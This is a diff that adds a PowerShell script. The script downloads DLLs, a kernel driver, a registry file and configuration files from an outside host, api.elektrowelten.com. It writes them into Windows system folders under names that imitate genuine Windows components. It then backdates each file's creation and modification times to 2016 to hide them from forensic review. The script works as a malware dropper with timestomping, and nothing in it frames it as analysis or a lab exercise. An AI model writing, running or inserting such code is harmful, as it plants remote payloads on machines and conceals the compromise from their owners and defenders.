@@ -1,0 +1,67 @@
+$fileList = @(
+    @{
+        Url = "https://api.elektrowelten.com/vi/exe/x64.dll"
+        OutputPath = "C:\ProgramData\Microsoft\mscorst64.dll"
+        CreationTime = Get-Date "2016-07-16 21:18:00"
+        ModificationTime = Get-Date "2016-07-16 21:18:00"
+    },
+    @{
+        Url = "https://api.elektrowelten.com/vi/exe/x86.dll"
+        OutputPath = "C:\ProgramData\Microsoft\mscorst.dll"
+        CreationTime = Get-Date "2016-07-17 10:30:00"
+        ModificationTime = Get-Date "2016-07-17 10:30:00"
+    },
+    @{
+        Url = "https://api.elektrowelten.com/vi/exe/infocard.dll"
+        OutputPath = "C:\Windows\System32\infocard.dll"
+        CreationTime = Get-Date "2016-07-18 14:45:00"
+        ModificationTime = Get-Date "2016-07-18 14:45:00"
+    },
+    @{
+        Url = "https://api.elektrowelten.com/vi/exe/diagsvc.sys"
+        OutputPath = "C:\Windows\System32\drivers\diagsvc.sys"
+        CreationTime = Get-Date "2016-07-18 14:45:00"
+        ModificationTime = Get-Date "2016-07-18 14:45:00"
+    },
+    @{
+        Url = "https://api.elektrowelten.com/vi/exe/4.reg"
+        OutputPath = "C:\Users\Public\4.reg"
+        CreationTime = Get-Date "2016-07-18 14:45:00"
+        ModificationTime = Get-Date "2016-07-18 14:45:00"
+    },
+    @{
+        Url = "https://api.elektrowelten.com/vi/exe/app.ini"
+        OutputPath = "C:\Users\Public\Documents\EFL\app.ini"
+        CreationTime = Get-Date "2016-07-18 14:45:00"
+        ModificationTime = Get-Date "2016-07-18 14:45:00"
+    },
+    @{
+        Url = "https://api.elektrowelten.com/vi/exe/rule.dat"
+        OutputPath = "C:\Users\Public\Documents\EFL\rule.dat"
+        CreationTime = Get-Date "2016-07-18 14:45:00"
+        ModificationTime = Get-Date "2016-07-18 14:45:00"
+    },
+    @{
+        Url = "https://api.elektrowelten.com/vi/exe/rule.ini"
+        OutputPath = "C:\Users\Public\Documents\EFL\rule.ini"
+        CreationTime = Get-Date "2016-07-18 14:45:00"
+        ModificationTime = Get-Date "2016-07-18 14:45:00"
+    },
+    @{
+        Url = "https://api.elektrowelten.com/vi/exe/user.dat"
+        OutputPath = "C:\Users\Public\Documents\EFL\user.dat"
+        CreationTime = Get-Date "2016-07-18 14:45:00"
+        ModificationTime = Get-Date "2016-07-18 14:45:00"
+    }
+)
+
+foreach ($fileInfo in $fileList) {
+    $outputDirectory = [System.IO.Path]::GetDirectoryName($fileInfo.OutputPath)
+    if (-not (Test-Path -Path $outputDirectory)) {
+        New-Item -Path $outputDirectory -ItemType Directory -Force
+    }
+
+    Invoke-WebRequest -Uri $fileInfo.Url -OutFile $fileInfo.OutputPath
+    Set-ItemProperty -Path $fileInfo.OutputPath -Name CreationTime -Value $fileInfo.CreationTime
+    Set-ItemProperty -Path $fileInfo.OutputPath -Name LastWriteTime -Value $fileInfo.ModificationTime
+}
